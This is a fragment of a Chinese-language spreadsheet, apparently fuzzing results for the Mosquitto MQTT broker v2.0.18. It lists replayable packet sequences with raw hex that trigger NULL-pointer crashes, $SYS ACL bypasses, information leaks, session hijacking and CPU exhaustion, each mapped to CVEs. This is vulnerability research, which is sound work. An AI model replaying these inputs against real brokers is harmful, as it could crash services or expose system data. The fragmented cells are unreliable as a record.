        <f>== 种子标识: id:000008,sev:4,cat:0244 ===\u000a大小: 1524B (报告+请求数据)\u000a请求数据: 882B\u000a\u000a---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MQTT请求序列(882B原始二进制) ---\u000aMsg[1]: CONNECT Proto=rp1/test/+\x02\x02;4\x00\x1c$shgre/g3/homeÿ\x7f\x00\x80ÿQTT\x04\x02\x00&lt;\x00\x07fuzz_c6\x827\x00\x8d\x00$SYS v47 ClientID=''(25970B) clean_session=True keepalive=29295s [自动清理会话] | raw_header=1f7f003c7270312f746573742f2b0202\u000aMsg[2]: PUBREL PacketID=11055 | raw_header=652f2b2f74656d706572617475726500\u000aMsg[3]: CONNACK session_present=111 reason_code=95 | raw_header=2f726f5f63368237008d00245359532f\u000aMsg[4]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=1)] | raw_header=8212000100001173656e736f722f726f\u000aMsg[5]: UNSUBSCRIBE  | raw_header=a4656d7032322e352f2b2f74656d7065\u000aMsg[6]: PUBCOMP  | raw_header=7f00\u000aMsg[7]: TYPE0  | raw_header=044d5154540402003c000766757a7a5f\u000aMsg[8]: CONNACK session_present=104 reason_code=97 | raw_header=2473686172652f67332f686f6d652f2b\u000aMsg[9]: PUBREL PacketID=27953 | raw_header=6f6f6d31000766757a7a5f6336823700\u000aMsg[10]: PUBREL PacketID=25955 | raw_header=6e6e6563746564000012247368617265\u000aMsg[11]: (不完整,42B) raw=2b2f74656d7065726174757265008efeaf903d4e846083a1586a1b6ea833084e3deb7adb30170011\u000a(尾部42B): 2b2f74656d7065726174757265008efeaf903d4e846083a1586a1b6ea833084e3deb7adb301700115b9b</f>
        <v/>
      </c>
      <c r="F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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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9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6">
      <c r="A96" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B96" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C96" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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96" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c4 ===\u000a大小: 1444B (报告+请求数据)\u000a请求数据: 595B\u000a\u000a---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MQTT请求序列(595B原始二进制) ---\u000aMsg[1]: PUBCOMP PacketID=33330 | raw_header=725582321eb1921392132c36302f6200\u000aMsg[2]: SUBSCRIBE PacketID=4096 Topics=[''(零长度!QoS=2)] | raw_header=82321000000092132436302f62726f6b\u000aMsg[3]: (不完整,456B) raw=d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4\u000a(尾部456B): d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4797979797979797982</f>
        <v/>
      </c>
      <c r="F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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J9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9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7">
      <c r="A97" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B97" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C97" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(297B)\u000a4.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0x02c6\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E97" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c6 ===\u000a大小: 1786B (报告+请求数据)\u000a请求数据: 297B\u000a\u000a---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MQTT请求序列(297B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=100766757a7a5f6335\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=0)] | raw_header=820b00010006746573742f2300\u000aMsg[3]: PUBLISH Topic='test/x' QoS=0 retain=False payload='before_unsub' | raw_header=30140006746573742f786265666f7265\u000aMsg[4]: SUBSCRIBE PacketID=6 Topics=[''(零长度!QoS=1)] | raw_header=821f0006000009612f622f632f642f65\u000aMsg[5]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=149B | raw_header=39b401001d245359532f62726f6b6572\u000aMsg[6]: UNSUBSCRIBE  | raw_header=a20a00020006746573742f23\u000aMsg[7]: PUBLISH Topic='test/x' QoS=0 retain=False payload='after_unsub' | raw_header=30130006746573742f7861667465725f\u000aMsg[8]: PINGREQ  | raw_header=c000\u000aMsg[9]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J9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9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98">
      <c r="A98" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000008,sev:4,cat:03c5</t>
        </is>
      </c>
      <c r="B98" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C98" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(335B)\u000a4.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98" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:03c5 ===\u000a大小: 1528B (报告+请求数据)\u000a请求数据: 335B\u000a\u000a---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MQTT请求序列(335B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v2 ClientID=''(0B) clean_session=False keepalive=47s Will=YES [持久会话] | raw_header=100c00044d515454021c002f0000\u000aMsg[2]: SUBSCRIBE PacketID=13635 Topics=['$s_\x04½âÇÜ\x85-ÑÁ '(QoS=0), ''(零长度!QoS=1)] | raw_header=82313543000d24735f04bde2c7dc852d\u000aMsg[3]: PUBLISH Topic='+/data' QoS=0 retain=True payload_len=59B | raw_header=314300062b2f6461746154ff498914e9\u000aMsg[4]: (不完整,201B) raw=b1f85a70575f6d706572617475726501314300062b2f6461746154ff498914e96385a8104bfc8730\u000a(尾部201B): b1f85a70575f6d706572617475726501314300062b2f6461746154ff498914e96385a8104bfc8730e5034934f02cbf5f04bd</f>
        <v/>
      </c>
      <c r="F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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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9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9">
      <c r="A99" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B99" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C99" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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99" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0002 ===\u000a大小: 404B (报告+请求数据)\u000a请求数据: 79B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(79B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4 Topics=[] | raw_header=821300044d5154540480003c00076675\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload='\x00\x12home/' | raw_header=3426001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,18B) raw=2b2f74656d7065726174757265527a5f6333\u000a(尾部18B): 2b2f74656d7065726174757265527a5f6333</f>
        <v/>
      </c>
      <c r="F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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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9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0">
      <c r="A100" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:000a</t>
        </is>
      </c>
      <c r="B100" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C100" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(39B)\u000a4.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100" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:000a ===\u000a大小: 2866B (报告+请求数据)\u000a请求数据: 39B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(39B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4 Topics=['$SYS/#'(QoS=0)] | raw_header=820b00040006245359532f2300\u000aMsg[2]: UNSUBSCRIBE  | raw_header=a2150005001173656e736f722f74656d\u000aMsg[3]: (不完整,3B) raw=e4e000\u000a(尾部3B): e4e000</f>
        <v/>
      </c>
      <c r="F1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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J10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0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01">
      <c r="A101" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B101" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C101" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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01" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0082 ===\u000a大小: 724B (报告+请求数据)\u000a请求数据: 211B\u000a\u000a---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MQTT请求序列(211B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1472 Topics=[] | raw_header=823705c01b26000d2473686172652f67\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=True payload_len=82B | raw_header=3b670013245359532f62726f6b65722f\u000aMsg[3]: SUBSCRIBE PacketID=54034 Topics=[] | raw_header=8211d3124d11d3124d5154540402f154\u000aMsg[4]: (不完整,30B) raw=f05900076675cf7a5154540402f1590007663354540402f1ad00076675ff\u000a(尾部30B): f05900076675cf7a5154540402f1590007663354540402f1ad00076675ff</f>
        <v/>
      </c>
      <c r="F1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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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0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2">
      <c r="A102" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:008a</t>
        </is>
      </c>
      <c r="B102" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C102" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(158B)\u000a4.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102" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:008a ===\u000a大小: 899B (报告+请求数据)\u000a请求数据: 158B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev1】MQTT: Retained message (potential resource exhaustion) (Cat=0x0080 Hash=0xc7f41b6e CVE=CVE-2023-3592)\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(158B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f1300c94c516a540101000000020800\u000aMsg[2]: SUBSCRIBE PacketID=1990 Topics=['$SYS/#roker/versi\x00\x04'(QoS=1)] | raw_header=823207c60013245359532f23726f6b65\u000aMsg[3]: (不完整,85B) raw=77c65359532f62726f6b65722f76557273696f6e02000174003537f012686f6d65af2b2f74658e70\u000a(尾部85B): 77c65359532f62726f6b65722f76557273696f6e02000174003537f012686f6d65af2b2f74658e706572617475726507c763</f>
        <v/>
      </c>
      <c r="F1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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J10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0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03">
      <c r="A103" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B103" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C103" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(2025B)\u000a4.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103" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c0 ===\u000a大小: 2397B (报告+请求数据)\u000a请求数据: 2025B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(2025B原始二进制) ---\u000aMsg[1]: CONNACK session_present=27 reason_code=97 | raw_header=25701b6100edff3c0514249126262626\u000aMsg[2]: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UNSUBACK  | raw_header=b626262626262626262626262626ffff\u000aMsg[6]: CONNECT  | raw_header=1000\u000aMsg[7]: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SUBSCRIBE PacketID=1 Topics=[] | raw_header=820b00010081746573742f2302\u000aMsg[14]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=340e04044b0404170404040400010006\u000aMsg[15]: PUBCOMP PacketID=29797 | raw_header=746574657374362302340e0006746573\u000aMsg[16]: (不完整,1377B) raw=a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7\u000a(尾部1377B): a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7</f>
        <v/>
      </c>
      <c r="F1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0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03" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J10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03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4">
      <c r="A104" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:00c2</t>
        </is>
      </c>
      <c r="B104" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C104" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(28384B)\u000a4.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104" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c2 ===\u000a大小: 4805B (报告+请求数据)\u000a请求数据: 28384B\u000a\u000a---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MQTT请求序列(28384B原始二进制) ---\u000aMsg[1]: (不完整,4325B) raw=92929292929292929292929292929292929292929292929292929292929292929292929292929292\u000a(尾部4325B): 9292929292929292929292929292929292929292929292929292929292929292929292929292929292929292929292929292</f>
        <v/>
      </c>
      <c r="F1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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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0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5">
      <c r="A105" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B105" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C105" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(452B)\u000a4.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05" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0101 ===\u000a大小: 1141B (报告+请求数据)\u000a请求数据: 452B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(452B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=19ff0000000000000000000000c00000\u000aMsg[2]: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raw_header=0000\u000a(尾部274B): 000000000000000000000000000000000000000080000000000000000000000000000000000000f1ffffff00000000000000</f>
        <v/>
      </c>
      <c r="F1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0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05" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J10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0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06">
      <c r="A106" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B106" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C106" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(61B)\u000a4.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106" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0102 ===\u000a大小: 933B (报告+请求数据)\u000a请求数据: 61B\u000a\u000a---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MQTT请求序列(61B原始二进制) ---\u000aMsg[1]: DISCONNECT 断开连接 | raw_header=ed00\u000aMsg[2]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=25s Will=YES WillTopic='$SYS/broker/clients/connected' [自动清理会话] | raw_header=103900044d515454040e00190000001d</f>
        <v/>
      </c>
      <c r="F1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10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106" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J10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10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7">
      <c r="A107" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B107" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C107" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(309B)\u000a4.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107" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0103 ===\u000a大小: 1021B (报告+请求数据)\u000a请求数据: 309B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(309B原始二进制) ---\u000aMsg[1]: CONNECT Proto=M\x80\x82O v0 ClientID=''(0B) clean_session=False keepalive=12326s [持久会话] | raw_header=101300044d80824f002130260000002b\u000aMsg[2]: PUBREL PacketID=25968 | raw_header=646565702f746f7069632f6c6576656c\u000aMsg[3]: CONNACK session_present=114 reason_code=112 | raw_header=2f677270312f23090016f6db4e06d3b6\u000aMsg[4]: (不完整,80B) raw=2f726f636d5404020023007f7a5f63368032206112000000004e50657449ff8032206112000000f6\u000a(尾部80B): 2f726f636d5404020023007f7a5f63368032206112000000004e50657449ff8032206112000000f601435249424520500000</f>
        <v/>
      </c>
      <c r="F1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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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0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08">
      <c r="A108" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:010a</t>
        </is>
      </c>
      <c r="B108" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C108" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(359B)\u000a4.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108" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:010a ===\u000a大小: 1039B (报告+请求数据)\u000a请求数据: 359B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(359B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=102200044d51545404c2003c00000009\u000aMsg[2]: SUBSCRIBE PacketID=16 Topics=['$SYS/#'(QoS=0)] | raw_header=820b00100006245359532f2300\u000aMsg[3]: PUBLISH Topic='sensor/temp/room1' QoS=1 retain=False payload='\x00\x11{"temp":22\x82$\x00' | raw_header=3222001173656e736f722f74656d702f\u000aMsg[4]: PUBCOMP  | raw_header=7c00\u000aMsg[5]: TYPE0  | raw_header=0a746573742f746f7069630000122473\u000aMsg[6]: PUBREL PacketID=11055 | raw_header=652f2b2f737461747573001200010203\u000aMsg[7]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[8]: (不完整,38B) raw=4141414141414141414141414141414141414141414141414141414141414141414141c000e0\u000a(尾部38B): 4141414141414141414141414141414141414141414141414141414141414141414141c000e0</f>
        <v/>
      </c>
      <c r="F1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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J10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0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09">
      <c r="A109" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:010b</t>
        </is>
      </c>
      <c r="B109" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C109" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(388B)\u000a4.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109" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:010b ===\u000a大小: 1112B (报告+请求数据)\u000a请求数据: 388B\u000a\u000a---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MQTT请求序列(388B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQ\x00\x00 v2 ClientID=''(0B) clean_session=False keepalive=60s [持久会话] | raw_header=102200044d5100000200003c00000009\u000aMsg[2]: SUBSCRIBE PacketID=16 Topics=['$SYS/#'(QoS=0)] | raw_header=820b00100006245359532f2300\u000aMsg[3]: PUBLISH Topic='sensor/temp/room1' QoS=1 retain=False payload='\x00\x11{"temp@"\x00\x11sen' | raw_header=3222001173656e736f722f74656d702f\u000aMsg[4]: CONNECT  | raw_header=1000\u000aMsg[5]: PUBCOMP PacketID=29797 | raw_header=722f74656d702f726f6f6d3100117b22\u000aMsg[6]: TYPE0  | raw_header=03301600146465766963652f2f23336d\u000aMsg[7]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[8]: PUBCOMP  | raw_header=7300\u000aMsg[9]: CONNECT  | raw_header=1200\u000aMsg[10]: TYPE0  | raw_header=01020330\u000aMsg[11]: CONNECT  | raw_header=1600\u000aMsg[12]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=146465766963652f2f23336d005f3031\u000aMsg[13]: (不完整,23B) raw=41414141414141414141414141414141414141c9000300\u000a(尾部23B): 41414141414141414141414141414141414141c9000300</f>
        <v/>
      </c>
      <c r="F1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9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9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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J109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0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10">
      <c r="A110" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B110" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C110" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(16385B)\u000a4.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110" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0181 ===\u000a大小: 4778B (报告+请求数据)\u000a请求数据: 16385B\u000a\u000a---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MQTT请求序列(16385B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=33286 Topics=[] | raw_header=82028206\u000aMsg[2]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=140f0000000000000000000000000000\u000aMsg[3]: CONNECT  | raw_header=1000\u000aMsg[4]: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raw_header=0000\u000a(尾部4184B): 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007200000000</f>
        <v/>
      </c>
      <c r="F1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1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10" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J11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1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11">
      <c r="A111" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:018a</t>
        </is>
      </c>
      <c r="B111" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C111" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000009,sev:3,cat:018a)中的REQUEST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0x018a\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E111" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:018a ===\u000a大小: 1114B (报告+请求数据)\u000a请求数据: 247B\u000a\u000a---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CVE=CVE-2023-3592)\u000a\u000a--- MQTT请求序列(247B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=102200044d51545404c2003c00000009\u000aMsg[2]: SUBSCRIBE PacketID=61727 Topics=['$SYS/#'(QoS=0)] | raw_header=820bf11f0006245359532f2300\u000aMsg[3]: PUBLISH Topic='sensor/temE/room1' QoS=1 retain=False payload='\x00\x11{"temp":22.5}' | raw_header=3222001173656e736f722f74656d452f\u000aMsg[4]: PUBLISH Topic='hare\x82\x12\x00\x01\x00\u000dsen' QoS=2 retain=True payload='sor/+/' | raw_header=3515000d6861726582120001000d7365\u000aMsg[5]: PUBCOMP PacketID=27924 | raw_header=74656d146465766963652f2b2f74656c\u000aMsg[6]: (不完整,36B) raw=4141414141414141414141414141414141414141414141414141414141414141c000e000\u000a(尾部36B): 4141414141414141414141414141414141414141414141414141414141414141c000e000</f>
        <v/>
      </c>
      <c r="F1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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J11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1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12">
      <c r="A112" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B112" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C112" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(299B)\u000a4.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12" s="2">
